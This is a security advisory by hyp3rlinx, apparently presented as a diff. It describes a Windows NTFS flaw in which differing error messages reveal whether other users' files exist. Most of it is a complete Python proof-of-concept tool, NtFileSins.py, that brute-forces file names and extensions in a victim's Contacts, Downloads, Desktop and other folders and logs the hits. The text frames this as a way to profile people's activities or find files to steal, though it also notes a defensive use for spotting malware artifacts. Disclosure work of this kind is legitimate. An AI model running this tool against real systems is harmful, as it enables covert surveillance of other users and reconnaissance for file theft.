@@ -1,0 +1,458 @@
+[+] Credits: John Page (aka hyp3rlinx)		
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/MICROSOFT-WINDOWS-NTFS-PRIVILEGED-FILE-ACCESS-ENUMERATION.txt
+[+] ISR: ApparitionSec          
+ 
+
+[Vendor]
+www.microsoft.com
+
+
+[Product]
+Windows NTFS
+
+NTFS is a proprietary journaling file system developed by Microsoft. Starting with Windows NT 3.1, it is the default file system of the Windows NT family.
+
+
+[Vulnerability Type]
+Privileged File Access Enumeration
+
+
+[CVE Reference]
+N/A
+
+
+[Security Issue]
+Attackers possessing user-only rights can gather intelligence or profile other user account activities by brute forcing a correct file name.
+This is possible because Windows returns inconsistent error messages when accessing unauthorized files that contain a valid extension
+or have a "." (dot) as part of the file or folder name.
+
+Typically, you see enumeration in web-application attacks which target account usernames. In this case we are targeting the filenames
+of other users, maybe we need to locate files up front that we wish to steal possibly prior to launching say an XXE exploit to steal
+those files or maybe we just passively sniff the accounts directories to profile the mark and or learn their daily activities.
+
+Standard account users attempting to open another users files or folders that do not contain a valid extension or dot "." in its filename
+are always issued the expected "Access is denied" system error message.
+
+However, for files that contain a (dot) in the filename and that also don't exist, the system echoes the following attacker friendly warning:
+"The system cannot find the file".
+
+This error message inconsistency allows attackers to infer files EXIST, because any other time we would get "The system cannot find the file".
+
+Example, the Windows commands DIR or TYPE always greet attackers with an expected "Access is denied" message, whether the file exists or not.
+This helps protect users from having their local files known to attackers, since the system returns the same message regardless if files
+exist or not when using those commands. Those commands output messages are not affected by the file having a valid extension or not.
+
+However, we can bypass that protection by avoiding the Windows DIR or TYPE commands and instead attempt to directly open any inaccessible
+users file on the command line much like calling a program and pressing the enter key.
+
+After the Win32 API function CreateFile is called an it returns either:
+
+1) "The system cannot find the file"
+2) "Access is denied"
+
+C:\Users\noprivs>c:\Users\privileged-victim\Contacts\Hubert Dingleberry.contact
+The system cannot find the file <==== DOES NOT EXIST
+
+C:\Users\noprivs>c:\Users\privileged-victim\Contacts\Toolio McDoucheLeroy.contact
+Access is denied.  <===== EXISTS
+
+C:\Users\noprivs>c:\Users\privileged-victim\Contacts\Toolio McDoucheLeroy.con
+The system cannot find the file <==== DOES NOT EXIST
+
+C:\Users\noprivs>c:\Users\privileged-victim\Contacts\whatever 
+Access is denied.  <===== FALSE POSITIVE NO EXTENSION PRESENT IN THE FILENAME
+
+From a defensive perspective we can leverage this to try to detect basic IOC and malware artifacts like .tmp, .ini, .dll, .exe 
+or related config files on disk with user-only rights, instead of authenticating with admin rights as a quick paranoid first pass.
+
+Example, if malware hides itself by unlinking themselves from the EPROCESS list in memory or using programs like WinRAP to hide
+processess from Windows TaskMgr, we may not discover them even if using tasklist command. The EPROCESS structure and flink/blink is
+how Windows TaskMgr shows all running processes. However, we may possibly detect them by testing for the correct IOC name if the
+malicious code happens to reside on disk and not only in memory. Whats cool is we can be do this without the need for admin rights.
+
+Other Windows commands that will also let us confirm file existence by comparing error messages are start, call, copy, icalcs, and cd.
+However, Windows commands rename, ren, cacls, type, dir, erase, move or del commands will issue flat out "Access is denied" messages.
+
+Previously, MSRC recommended using ABE. However, that feature is only for viewing files and folders in a shared folder, not when viewing
+files or folders in the local file system.
+
+
+Tested successfully Win7/10
+
+
+[Exploit/POC]
+"NtFileSins.py"
+
+from subprocess import Popen, PIPE
+import sys,argparse,re
+
+# NtFileSins v2.1
+# Added: Check for Zone.Identifer:$DATA to see if any identified files were downloaded from internet.
+# Fixed: save() logic to log report in case no Zone.Identifiers found.
+#
+# Windows File Enumeration Intel Gathering.
+# Standard users can prove existence of privileged user artifacts.
+#
+# Typically, the Windows commands DIR or TYPE hand out a default "Access Denied" error message,
+# when a file exists or doesn't exist, when restricted access is attempted by another user.
+#
+# However, accessing files directly by attempting to "open" them from cmd.exe shell,
+# we can determine existence by compare inconsistent Windows error messages.
+#
+# Requirements: 1) target users with >= privileges (not admin to admin).
+#               2) artifacts must contain a dot "." or returns false positives.
+#
+# Windows message "Access Denied" = Exists
+# Windows message "The system cannot find the file" = Not exists
+# Windows returns "no message"  OR  "c:\victim\artifact is not recognized as an internal or external command,
+# operable program or batch file" = Admin to Admin so this script is not required.
+#
+# Profile other users by compare ntfs error messages to potentially learn their activities or machines purpose.
+# For evil or maybe check for basic malware IOC existence on disk with user-only rights.
+#
+#======================================================================#
+# NtFileSins.py - Windows File Enumeration Intel Gathering Tool v2.1   #
+# By John Page (aka hyp3rlinx)                                         #
+# Apparition Security                                                  #
+#======================================================================#
+
+BANNER='''
+    _   _______________ __    _____ _           
+   / | / /_  __/ ____(_) /__ / ___/(_)___  _____
+  /  |/ / / / / /_  / / / _ \\__ \ / / __ \/ ___/
+ / /|  / / / / __/ / / /  __/__/ / / / / (__  ) 
+/_/ |_/ /_/ /_/   /_/_/\___/____/_/_/ /_/____/  v2.1                                                                                     
+ By hyp3rlinx
+ ApparitionSec                                                                                                                     
+'''              
+
+sin_cnt=0
+internet_sin_cnt=0
+found_set=set()
+zone_set=set()
+ARTIFACTS_SET=set()
+ROOTDIR = "c:/Users/"
+ZONE_IDENTIFIER=":Zone.Identifier:$DATA"
+
+USER_DIRS=["Contacts","Desktop","Downloads","Favorites","My Documents","Searches","Videos/Captures",
+           "Pictures","Music","OneDrive","OneDrive/Attachments","OneDrive/Documents"]
+
+APPDATA_DIR=["AppData/Local/Temp"]
+
+EXTS = set([".contact",".url",".lnk",".search-ms",".exe",".csv",".txt",".ini",".conf",".config",".log",".pcap",".zip",".mp4",".mp3", ".bat",
+          ".wav",".docx",".pptx",".reg",".vcf",".avi",".mpg",".jpg",".jpeg",".png",".rtf",".pdf",".dll",".xml",".doc",".gif",".xls",".wmv"])
+
+REPORT="NtFileSins_Log.txt"
+
+def usage():
+    print "NtFileSins is a privileged file access enumeration tool to search multi-account artifacts without admin rights.\n"
+    print '-u victim -d Searches -a "MS17-020 - Google Search.url"'
+    print '-u victim -a "<name.ext>"'
+    print "-u victim -d Downloads -a <name.ext> -s"
+    print '-u victim -d Contacts -a "Mike N.contact"'
+    print "-u victim -a APT.txt -b -n"
+    print "-u victim -d -z Desktop/MyFiles -a  <.name>"
+    print "-u victim -d Searches -a <name>.search-ms"
+    print "-u victim -d . -a <name.ext>"
+    print "-u victim -d desktop -a inverted-crosses.mp3 -b"
+    print "-u victim -d Downloads -a APT.exe -b"
+    print "-u victim -f list_of_files.txt"
+    print "-u victim -f list_of_files.txt -b -s"
+    print "-u victim -f list_of_files.txt -x .txt"
+    print "-u victim -d desktop -f list_of_files.txt -b"
+    print "-u victim -d desktop -f list_of_files.txt  -x .rar"
+    print "-u victim -z -s -f list_of_files.txt"
+
+def parse_args():
+    parser.add_argument("-u", "--user", help="Privileged user target")
+    parser.add_argument("-d", "--directory", nargs="?", help="Specific directory to search <e.g. Downloads>.")
+    parser.add_argument("-a", "--artifact", help="Single artifact we want to verify exists.")
+    parser.add_argument("-t", "--appdata", nargs="?", const="1", help="Searches the AppData/Local/Temp directory.")
+    parser.add_argument("-f", "--artifacts_from_file", nargs="?", help="Enumerate a list of supplied artifacts from a file.")
+    parser.add_argument("-n", "--notfound", nargs="?", const="1", help="Display unfound artifacts.")
+    parser.add_argument("-b", "--built_in_ext", nargs="?", const="1", help="Enumerate files using NtFileSin built-in ext types, if no extension is found NtFileSins will switch to this feature by default.")
+    parser.add_argument("-x", "--specific_ext", nargs="?", help="Enumerate using specific ext, e.g. <.exe> using a supplied list of artifacts, a supplied ext will override any in the supplied artifact list.")
+    parser.add_argument("-z", "--zone_identifier", nargs="?", const="1", help="Identifies artifacts downloaded from the internet by checking for Zone.Identifier:$DATA.")
+    parser.add_argument("-s", "--save", nargs="?", const="1", help="Saves successfully enumerated artifacts, will log to "+REPORT)
+    parser.add_argument("-v", "--verbose", nargs="?", const="1", help="Displays the file access error messages.")
+    parser.add_argument("-e", "--examples", nargs="?", const="1", help="Show example usage.")
+    return parser.parse_args()
+
+
+def access(j):
+    result=""
+    try:
+        p = Popen([j], stdout=PIPE, stderr=PIPE, shell=True)
+        stderr,stdout = p.communicate()
+        result = stdout.strip()
+    except Exception as e:
+        #print str(e)
+        pass
+    return result
+
+
+def artifacts_from_file(artifacts_file, bflag, specific_ext):
+    try:
+        f=open(artifacts_file, "r")
+        for a in f:
+            idx = a.rfind(".")
+            a = a.strip()
+            if a != "":
+                if specific_ext:
+                    if idx==-1:
+                        a = a + specific_ext
+                    else:
+                        #replace existing ext
+                        a = a[:idx] + specific_ext
+                if bflag:
+                    ARTIFACTS_SET.add(a)
+                else:
+                    ARTIFACTS_SET.add(a)
+        f.close()
+    except Exception as e:
+        print str(e)
+        exit()
+
+
+def save():
+    try:
+        f=open(REPORT, "w")
+        for j in found_set:
+            f.write(j+"\n")
+        f.close()
+    except Exception as e:
+        print str(e)
+
+
+def recon_msg(s):
+    if s == 0:
+        return "Access is denied."
+    else:
+        return "\t[*] Artifact exists ==>"
+
+
+def echo_results(args, res, x, i):
+    global sin_cnt
+    if res=="":
+        print "\t[!] No NTFS message, you must already be admin, then this script is not required."
+        exit()
+    if "not recognized as an internal or external command" in res:
+        print "\t[!] You must target users with higher privileges than yours."
+        exit()
+    if res != recon_msg(0):
+        if args.verbose:
+            print "\t"+res
+        else:
+            if args.notfound:
+                print "\t[-] not found: " + x +"/"+ i
+    else:
+        sin_cnt += 1
+        if args.save or args.zone_identifier:
+            found_set.add(x+"/"+i)
+        if args.verbose:
+            print recon_msg(1)+ x+"/"+i
+            print "\t"+res
+        else:
+            print recon_msg(1)+ x+"/"+i
+
+
+def valid_artifact_name(sin,args):
+    idx = "." in sin
+    if re.findall(r"[/\\*?:<>|]", sin):
+        print "\t[!] Skipping: disallowed file name character."
+        return False
+    if not idx and not args.built_in_ext and not args.specific_ext:
+        print "\t[!] Warning: '"+ sin +"' has no '.' in the artifact name, this can result in false positives."
+        print "\t[+] Searching for '"+ sin +"' using built-in ext list to prevent false positives."
+    if not args.built_in_ext:
+        if sin[-1] == ".":
+            print "\t[!] Skipping: "+sin+" non valid file name."
+            return False
+    return True
+
+
+def search_missing_ext(path,args,i):
+    for x in path:
+        for e in EXTS:
+            res = access(ROOTDIR+args.user+"/"+x+"/"+i+e)
+            echo_results(args, res, x, i+e)
+
+
+#Check if the found artifact was downloaded from internet
+def zone_identifier_check(args):
+    
+    global ROOTDIR, internet_sin_cnt
+    zone_set.update(found_set)
+    
+    for c in found_set:
+        c = c + ZONE_IDENTIFIER
+        res = access(ROOTDIR+args.user+"/"+c)
+        if res == "Access is denied.":
+           internet_sin_cnt += 1
+           print "\t[$] Zone Identifier found: "+c+" this file was downloaded over the internet!."
+           zone_set.add(c)
+
+
+def ntsins(path,args,i):
+    if i.rfind(".")==-1:
+        search_missing_ext(path,args,i)
+        i=""
+    for x in path:
+        if i != "":
+            if args.built_in_ext:
+                for e in EXTS:
+                    res = access(ROOTDIR+args.user+"/"+x+"/"+i+e)
+                    echo_results(args, res, x, i+e)
+            elif args.specific_ext:
+                idx = i.rfind(".")
+                if idx == -1:
+                    i = i + "."
+                else:
+                    i = i[:idx] + args.specific_ext
+            res = access(ROOTDIR+args.user+"/"+x+"/"+i)
+            echo_results(args, res, x, i)
+            
+
+def search(args):
+    print "\tSearching...\n"
+    global ROOTDIR, USER_DIRS, ARTIFACTS_SET
+    
+    if args.artifact:
+        ARTIFACTS_SET = set([args.artifact])
+        
+    for i in ARTIFACTS_SET:
+        idx = i.rfind(".") + 1
+        if idx and args.built_in_ext:
+            i = i[:idx -1:None]
+        if len(i) > 0 and i != None: 
+            if valid_artifact_name(i,args):
+                #specific user dir search
+                if args.directory:
+                    single_dir=[args.directory]
+                    ntsins(single_dir,args,i)
+                #search appdata dirs
+                elif args.appdata:
+                    ntsins(APPDATA_DIR,args,i)
+                #all default user dirs
+                else:
+                    ntsins(USER_DIRS,args,i)
+        
+
+def check_dir_input(_dir):
+    if len(re.findall(r":", _dir)) != 0:
+        print "[!] Check the directory arg, NtFileSins searches under c:/Users/target by default see Help -h."
+        return False
+    return True
+
+
+def main(args):
+
+    if len(sys.argv)==1:
+        parser.print_help(sys.stderr)
+        sys.exit(1)
+
+    if args.examples:
+        usage()
+        exit()
+
+    if not args.user:
+        print "[!] No target user specified see Help -h"
+        exit()
+
+    if args.appdata and args.directory:
+        print "[!] Multiple search directories supplied see Help -h"
+        exit()
+
+    if args.specific_ext:
+        if  "." not in args.specific_ext:
+            print "[!] Must use full extension e.g. -x ."+args.specific_ext+", dot in filenames mandatory to prevent false positives."
+            exit()
+            
+    if args.artifact and args.artifacts_from_file:
+        print "[!] Multiple artifacts specified, use just -f or -a see Help -h"
+        exit()
+        
+    if args.built_in_ext and args.specific_ext:
+        print "\t[!] Both specific and built-in extensions supplied, use only one."
+        exit()
+
+    if args.specific_ext and not args.artifacts_from_file:
+        print "\t[!] -x to be used with -f flag only see Help -h."
+        exit()
+        
+    if args.artifact:
+        if args.artifact.rfind(".")==-1:
+            print "\t[!] Artifacts must contain a .ext or will result in false positives."
+            exit()
+            
+    if args.directory:
+        if not check_dir_input(args.directory):
+            exit()
+            
+    if args.artifacts_from_file:
+        artifacts_from_file(args.artifacts_from_file, args.built_in_ext, args.specific_ext)
+
+    if not args.artifact and not args.artifacts_from_file:
+        print "[!] Exiting, no artifacts supplied see Help -h"
+        exit()
+    else:
+        search(args)
+
+    if sin_cnt >= 1 and args.zone_identifier:
+        zone_identifier_check(args)
+    
+    if args.save and len(found_set) != 0 and not args.zone_identifier:
+        save()
+        
+    if args.save and len(zone_set) != 0:
+        found_set.update(zone_set)
+        save()
+    
+    print "\n\tNtFileSins Detected "+str(sin_cnt)+ " out of %s" % str(len(ARTIFACTS_SET)) + " Sins.\n"
+    
+    if args.zone_identifier and internet_sin_cnt >= 1:
+        print "\t"+str(internet_sin_cnt) + " of the sins were internet downloaded.\n"
+    
+    if not args.notfound:
+        print "\tuse -n to display unfound enumerated files."
+    if not args.built_in_ext:
+        print "\tfor extra search coverage try -b flag or targeted artifact search -a."
+    
+if __name__ == "__main__":
+    print BANNER
+    parser = argparse.ArgumentParser()
+    main(parse_args())
+
+
+
+[POC Video URL]
+https://www.youtube.com/watch?v=rm8kEbewqpI
+
+
+
+[Network Access]
+Remote/Local
+
+
+
+[Severity]
+Low
+
+
+[Disclosure Timeline]
+Vendor Notification: July 29, 2019
+MSRC "does not meet the bar for security servicing" : July 29, 2019
+September 5, 2019 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
